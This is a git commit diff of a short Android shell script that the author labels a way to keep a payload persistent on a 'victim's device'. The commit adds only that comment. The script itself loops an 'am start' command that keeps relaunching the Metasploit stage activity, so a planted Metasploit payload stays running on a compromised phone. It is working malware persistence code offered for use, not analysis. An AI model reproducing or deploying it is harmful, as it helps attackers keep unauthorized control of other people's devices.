e730df56e65f9c53fdcf50982bf0471f17e2d0aa
Animesh Sinha <51500258+animesh-h@users.noreply.github.com>
2020-02-21 16:25:48 +0700

    Update script_android_hacking.sh

--- script_android_hacking.sh
+++ script_android_hacking.sh
@@ -1,3 +1,4 @@
+#this script is used when you want your payload as persistence in victim's device
 #!/bin/bash
 while true
 do am start -user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
